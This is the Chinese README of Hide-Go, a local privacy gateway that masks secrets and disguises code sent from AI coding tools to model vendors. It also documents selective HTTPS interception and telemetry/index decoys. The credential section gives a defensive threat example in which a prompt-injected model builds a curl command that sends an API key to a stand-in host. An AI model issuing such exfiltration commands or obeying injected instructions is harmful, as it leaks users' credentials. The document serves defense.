<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.png" />
  <img src="assets/logo.png" alt="HG Icon" width="84" />
</picture>
<br />
<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-wordmark-dark.png" />
  <img src="assets/logo-wordmark.png" alt="Hide-Go" width="280" />
</picture>

<p><b>本地 AI 编程工具的流量防火墙与双向脱敏网关</b></p>

[![Rust](https://img.shields.io/badge/Rust-1.80%2B-orange?logo=rust)](https://www.rust-lang.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)](#下载与安装)
[![Release](https://img.shields.io/github/v/release/Aflydream/hide-go?color=10b981)](https://github.com/Aflydream/hide-go/releases)
[![License](https://img.shields.io/badge/License-MIT-slate)](LICENSE)

[English](./README.md) | **简体中文**

[下载安装](#下载与安装) · [它是怎么拦的](#三种工作模式) · [支持的工具](#支持的客户端与接入方式) · [源码构建](#本地编译)

</div>

---

用 Claude Code、Cursor、Codex 写代码确实快，但如果你抓包看一眼它们往外发的请求，多半会吓一跳：很多时候你只是让它改一行报错，客户端已经在后台把你的 `.env`、Git 远端地址、内网数据库 IP、甚至整个工程目录树打包发往了云端（比如 `/api/event_logging` 或后台静默的 `repo-indexing`）。

**Hide-Go** 卡在本地工具和云端厂商之间。它以跨平台单文件安装程序分发，安装后运行轻量化 Rust 本地网关与桌面控制台，在请求出境前把真机密换成假数据或伪装代码，等大模型流式返回时再在本地毫秒级还原回去。

```mermaid
flowchart LR
    A["💻 本地 Harness\n(Claude Code / Cursor 等)"] -->|"1. 原始请求 (含真密钥/业务代码)"| B["🛡️ Hide-Go 本地网关\n(127.0.0.1:18787)"]
    B -->|"2. 占位符 / 植物园伪装代码 / 盲文乱码"| C["☁️ 大模型厂商服务器"]
    C -->|"3. SSE 流式响应 (基于伪装词推理)"| B
    B -->|"4. 滑动窗口实时还原真值"| A
```

---

## 三种工作模式

可以在桌面控制台顶部随时切换，不需要重启客户端：

| 模式 | 适用场景 | 本地发出的内容 | 厂商实际收到的内容 |
| :--- | :--- | :--- | :--- |
| **1. 仅监控审计** | 先看看哪个工具在偷偷传数据 | 原样保留 | 原样透传，但在本地面板高亮标出泄露的路径、密钥和遥测包 |
| **2. 自动双向脱敏** | 日常写业务代码，防密钥/内网拓扑外泄 | 含真实 DB 连接串、API Key、绝对路径 | 替换为**同格式密钥衍生假数据**，模型返回时自动换回真值 |
| **3. All-Hide** | 核心算法或高敏工程，连业务长相都不想露 | 金融清算、风控、核心私有模块 | **植物园浇水伪装代码** / **高熵盲文乱码** / **Chaff 假工程噪音** |

### 直观对比：厂商到底能看到什么？

假设你在本地让工具检查一段核心清算代码，开启 **All-Hide（同构伪装）** 前后的实际报文差异：

<table>
<tr>
<th width="50%">🔴 你在本地写的代码（不出境）</th>
<th width="50%">🟢 大模型厂商后台收到的代码</th>
</tr>
<tr>
<td>

```rust
// ProjectTitan HFT 核心清算模块
// 路径: /home/alice/ProjectTitan/src/pay.rs
pub fn verify_margin_liquidation(
    wallet_secret: &str,
) -> bool {
    let db = "postgres://admin:RealPass99@10.18.44.12:5432/prod";
    let key = "sk-ant-api03-secret9988776655";
    calculate_liquidation_ratio(wallet_secret, db, key)
}
```

</td>
<td>

```rust
// Calibrate misting interval for north greenhouse bed (#a7b3)
// Check soil moisture baseline before dawn irrigation (#4f21)
pub fn compost_magnolia_canopy(
    nectar_foliage_stem: &str,
) -> bool {
    let db = "lit_9f4k2m7p8a1c";
    let key = "lit_3d7w1q8n5z2x";
    chlorophyll_bamboo_grove(nectar_foliage_stem, db, key)
}
```

</td>
</tr>
</table>

> 伪装名称由会话密钥与项目 Salt 派生，每次运行的名称各不相同。上面的 `ProjectTitan` 是因为默认配置内置了对应的自定义规则样例。

> **为什么模型还能正常改代码？**
> 因为 `pub fn`、参数类型、返回值和调用关系（AST 结构）完全没变。模型顺着“植物园温室调度”帮你修好逻辑并发回数据流时，Hide-Go 会在本地把 `compost_magnolia_canopy` 实时换回 `verify_margin_liquidation`——SSE 流式响应走 `SseRestorer`，普通 JSON 响应走 `restore`，两条路径结果一致。

---

## All-Hide 的四个子开关

除了把标识符映射成其它行业词表，All-Hide 面板里还可以单独组合下面四项：

* 🔤 **字符串字面量掩码（Strict Literal Masking，默认开启）**：把代码中引号包裹的字面量替换为短占位令牌（`lit_…`），响应返回时还原；自然语言提示词不受影响。
* 🌱 **同构领域伪装（Isomorphic Camouflage，默认开启）**：内置 `植物园温室管理`、`公共图书馆编目`、`烘焙坊温控配方` 三套词库，结合运行时密钥与项目 Salt 将 snake_case / camelCase / PascalCase 复合标识符与 `//` / `# ` 注释映射到无关领域。普通英文单词和自然语言提示词保持原样，工具定义、调用 ID 与请求结构不加改写，请求始终是合法的 API 调用。
* ⠿ **高熵盲文乱码（Cipher Garble，默认关闭）**：把载荷加密成 `⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧` 盲文点阵块，厂商侧的明文日志审计与正则爬虫只能看到乱码。代价是**模型自己也读不懂这段内容**，只适合需要原样回传、不需要模型理解的数据。
* 🎭 **静默遥测与索引投毒（Telemetry & Indexing Chaff，默认开启）**：遥测请求不再离开本机，网关直接返回成功响应；后台代码索引上传保留原有 JSON 结构与大致相当的体积，内容整段换成诱饵代码。识别只依据**请求路径**，`/v1/messages`、`/chat/completions` 这类推理接口永远不会被当成遥测拦截。

---

## 支持的客户端与接入方式

程序内置了本机 AI 工具自动扫描、可执行路径/配置识别与**可逆一键接入**（清晰区分「无需根证书的 Base URL 反代」与「需信任根证书的选择性 HTTPS MITM」；修改前自动生成完整备份，卸载或断开时可无损回滚）：

| 工具名称 | 接入协议与证书要求 | 自动接入方式 | 重点拦截项 |
| :--- | :--- | :--- | :--- |
| **Claude Code** | Base URL 反代（`/claude-code`，无需根证书） | `~/.claude/settings.json`（保留已有上游网关链路） | `CLAUDE.md` 注入、目录读取回传、`/api/event_logging` 遥测 |
| **OpenAI Codex** | Base URL 反代（`/codex/v1`，无需根证书） | `~/.codex/config.toml`（修改实际生效的 `[model_providers.*].base_url` 或 `openai_base_url`，串接含本地中转端口的原上游）+ `OPENAI_BASE_URL` | 沙箱环境上下文、终端执行日志中的密钥 |
| **OpenAI / Anthropic 兼容客户端** | Base URL 反代（`/codex/v1`、`/claude-code`，无需根证书） | 将客户端自定义 Base URL 指向 `http://127.0.0.1:18787/...` | 各类 HTTP/JSON 对话与工具调用中的密钥、内网地址与路径 |
| **Cursor** | 选择性 HTTPS MITM + ConnectRPC/Protobuf（需安装信任根证书） | `Cursor/User/settings.json` + 托管环境脚本（`http.proxy` / 禁用 HTTP/2 回退） | Composer 多文件上下文、`repo-service` 分块上传 |
| **Qoder** | 选择性 HTTPS MITM + Protobuf/gRPC（需安装信任根证书） | `Qoder` / `QoderCN` `User/settings.json` + 托管环境脚本 | 后台全量代码库向量索引上传（Codebase Indexing） |
| **ZCode** | 选择性 HTTPS MITM（需安装信任根证书） | 托管环境脚本（`ZCODE_HTTP_PROXY` / `ZCODE_AGENT_CA_CERT` / `HTTPS_PROXY`） | 打开文件快照、自动补全上下文 |
| **Grok Build** | `/grok-build` + 选择性 HTTPS MITM（需安装信任根证书） | 托管环境脚本（`GROK_XAI_API_BASE_URL` / `GROK_CLI_CHAT_PROXY_BASE_URL` / `HTTPS_PROXY`） | 构建源码打包传输、构建报错日志中的内网地址 |
| **Antigravity** | 选择性 HTTPS MITM + gRPC/Protobuf + 可逆系统代理链（需安装信任根证书） | 可逆系统代理链（自动串接现有代理，退出/断开自动恢复）+ `Antigravity` `User/settings.json` + 托管环境脚本 | 多步规划与子智能体源码上传、gRPC/Protobuf 及 Gemini REST 载荷 |

<details>
<summary><b>📋 点击展开：命令行一键接入示例（Bash / PowerShell）</b></summary>

**Linux / macOS (Bash / Zsh)**
```bash
# Claude Code
export ANTHROPIC_BASE_URL="http://127.0.0.1:18787/claude-code"
export NO_PROXY="localhost,127.0.0.1,::1"

# OpenAI Codex
export OPENAI_BASE_URL="http://127.0.0.1:18787/codex/v1"
export HTTPS_PROXY="http://127.0.0.1:18787"
export NO_PROXY="localhost,127.0.0.1,::1"

# Grok Build
export GROK_XAI_API_BASE_URL="http://127.0.0.1:18787/grok-build/v1"
export HTTPS_PROXY="http://127.0.0.1:18787"
export NO_PROXY="localhost,127.0.0.1,::1"
```

**Windows (PowerShell)**
```powershell
$env:ANTHROPIC_BASE_URL = "http://127.0.0.1:18787/claude-code"
$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex/v1"
$env:HTTPS_PROXY        = "http://127.0.0.1:18787"
$env:NO_PROXY           = "localhost,127.0.0.1,::1"
```

</details>

> **选择性 TLS 拦截与无损兼容性说明**：
> * **仅解密 AI 域名，其它流量零触碰**：通过 `HTTPS_PROXY` / `CONNECT` 经过网关的流量，仅对内置或自定义 AI API 域名（如 `api.openai.com`、`api2.cursor.sh`、`*.qoder.sh` 等）动态签发叶子证书检查，OAuth 登录域名及 GitHub/npm 等通用站点全部走原始 TCP 透传，支持 HTTP/1.1、HTTP/2 与 WebSocket (`wss://`) 升级透传。
> * **显式 CA 信任与防断网探活**：桌面端托管的 `~/.hide-go/env.ps1` 与 Shell Profile 片段内置了本地端口探活逻辑，未启动 Hide-Go 时不会导出代理环境变量，避免终端断网；如需信任本地根证书，请在控制台「工具接入」页面显式点击「安装并信任根证书」（绝不静默篡改 Windows 注册表）。

## 工具调用里的密钥默认只在写文件时还原

模型发起的工具调用（Shell 命令、网络请求、文件写入）会在你本机执行。如果在这些参数里一律还原真实密钥，被提示注入的模型只要照着占位符拼一条 `curl https://x/?k=sk-ant-api03-K8mN2pQ5rT9vW3xZ`，本机执行的就是带真实 key 的命令。所以默认策略是：**只在写入或编辑文件的内容字段里还原，命令行与 URL 中保持占位符**；需要真实密钥的命令请改用环境变量。可在「保护策略 → 工具调用中的凭据」中改为「始终保留占位符」或「全部还原」。普通文本回复里的占位符始终会还原，路径、内网地址等非凭据数据不受这项设置影响。

---

## 下载与安装

从 [Releases 页面](https://github.com/Aflydream/hide-go/releases) 下载对应平台的 **Hide-Go Setup** 安装程序：

* **Windows (x64)**：下载并直接双击运行 `Hide-Go-Setup-windows-x64.exe`
* **macOS (Apple Silicon)**：
  ```bash
  tar -xzf Hide-Go-Setup-macos-arm64.tar.gz && ./Hide-Go-Setup
  ```
* **Linux (x86_64)**：
  ```bash
  tar -xzf Hide-Go-Setup-linux-x86_64.tar.gz && ./Hide-Go-Setup
  ```

安装程序也支持静默命令行部署与卸载：

```bash
# 静默安装到指定目录并自动接入已检测到的 AI 工具
Hide-Go-Setup --silent --install --dir /path/to/Hide-Go --auto-connect

# 静默卸载并回滚所有由 Hide-Go 写入的接入配置
Hide-Go-Setup --silent --uninstall --dir /path/to/Hide-Go
```

### 运行说明

安装完成后运行桌面程序 `hide-go-desktop`，启动后默认监听 `127.0.0.1:18787` 并打开桌面控制台；若需在无桌面环境下作为后台守护进程运行，设置 `HIDE_GO_HEADLESS=1` 或直接运行安装目录下的 `hide-go-daemon`：

| 环境变量 | 作用 |
| :--- | :--- |
| `HIDE_GO_PORT` | 监听端口，默认取配置文件中的值（`18787`） |
| `HIDE_GO_HEADLESS` | 设置后不拉起控制台窗口 |
| `HIDE_GO_CONFIG` | 配置文件路径。默认是 `%APPDATA%\hide-go\config.json`（Windows）、`~/Library/Application Support/hide-go/config.json`（macOS）、`~/.config/hide-go/config.json`（Linux） |
| `HIDE_GO_UPSTREAM_URL` | 把所有工具的上游改为自建或第三方兼容端点；单个请求也可以用 `X-Hide-Go-Upstream` 头覆盖 |
| `HIDE_GO_ADMIN_TOKEN` | 固定管理 API 令牌；不设置则每次启动随机生成 |

### 数据留在哪

* 网关只监听 `127.0.0.1`，局域网里的其他设备访问不到。
* **映射表**（占位符 ↔ 真实值）只存在于进程内存，退出即清空；最多 50,000 条，超出后淘汰最久未使用的条目。
* **流量记录**同样只在内存里，保留最近 200 条。
* 写入磁盘的只有配置文件：处理模式、自定义规则、检查更新偏好和项目 Salt。Salt 在首次运行时随机生成。
* 管理 API 需要令牌，并校验 `Host` / `Origin` / `Sec-Fetch-Site`，用来挡 DNS 重绑定和跨站请求；令牌不放在 cookie 里。

---

## 本地编译

环境要求：Rust `1.80+`，Node.js `20+`。

```bash
# 1. 运行核心、桌面端与安装器单元测试
cargo test --workspace

# 2. 打包前端并编译共享运行库与主程序/守护进程启动器
npm install && npm run build
cargo build --release -p hide-chrome -p hide-engine -p hide-go-desktop -p hide-daemon

# 3. 打包运行负载、嵌入编译单文件安装器并输出校验文件（Windows PowerShell 示例）
node scripts/package-setup.mjs --mode stage-payload --os windows --out target/pkg/app-windows.tar.gz
$env:HIDE_GO_EMBED_PAYLOAD_ARCHIVE = "target/pkg/app-windows.tar.gz"
cargo build --release -p hide-setup
node scripts/package-setup.mjs --mode release-setup --os windows --out target/pkg/Hide-Go-Setup-windows-x64.exe
```

### 代码结构

```text
hide-go/
├── crates/hide-core/          # Rust 核心隐私网关、脱敏引擎、映射表与流式还原库
│   ├── src/
│   │   ├── scanner.rs         # 基于 RegexSet 单遍预筛的密钥、私钥、DB 连接串、内网 IP 与自定义规则扫描
│   │   ├── vault.rs           # 线程安全双向映射表 (占位符 <-> 原文)，前缀树加速查找
│   │   ├── desensitizer.rs    # HMAC 密钥派生的同格式假数据生成器
│   │   ├── all_hide.rs        # 同构伪装词表、字面量掩码、盲文加密、诱饵生成器
│   │   ├── protocol.rs        # 各家协议中必须保持原样的字段（ID、枚举、签名块、工具 schema）
│   │   ├── restore.rs         # JSON 响应还原与工具调用凭据策略
│   │   ├── sse_restorer.rs    # 按协议分通道的 SSE 流式还原器
│   │   ├── stream_restorer.rs # 跨 Chunk 边界的滑动窗口文本还原器
│   │   ├── harness.rs         # 7 款工具的识别、路由与脚本生成
│   │   ├── harness_detect.rs  # 本机 AI 工具扫描、配置文件/环境变量自动接入与可逆回滚
│   │   └── proxy.rs           # Axum 反向代理、管理 API、版本检查与离线模拟器
│   └── tests/                 # 安全加固与回归测试
├── crates/hide-chrome/        # 原生 WebView 窗口与系统弹窗辅助库 (rlib + cdylib)
├── crates/hide-engine/        # 共享核心引擎 (rlib + cdylib)：网关、磁盘 UI 服务、守护进程与安装逻辑
├── crates/hide-launcher/      # 已安装端的轻量 C-ABI 动态库加载与错误引导层
├── crates/hide-daemon/        # 轻量守护进程入口 (hide-go-daemon)
├── crates/hide-setup/         # 图形化安装与卸载向导 (hide-go-setup)
├── scripts/package-setup.mjs  # 打包发布安装程序
├── src/                       # 桌面控制台与安装向导 UI（React + Vite + Tailwind）
└── desktop/                   # 轻量桌面控制台引导程序 (hide-go-desktop) 及应用图标资源
```

---

## 社区

- 论坛：[linux.do](https://linux.do)
